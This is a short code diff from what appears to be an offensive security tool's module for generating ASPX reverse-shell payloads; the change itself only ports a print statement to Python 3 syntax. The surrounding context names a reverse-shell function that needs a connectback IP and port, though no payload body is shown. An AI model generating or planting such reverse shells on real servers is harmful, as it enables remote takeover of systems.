@@ -12,7 +12,7 @@ class AspxShellcode(Shellcode):
     def get_reverse(self, inline=False):
         """ Function to get aspx reverse shellcode """
         if not self.CONNECTBACK_IP or not self.CONNECTBACK_PORT:
-            print "Settings for connectback listener must be defined"
+            print ("Settings for connectback listener must be defined")
             return False
         aspx = """
 <%@ Page Language="C#" %>
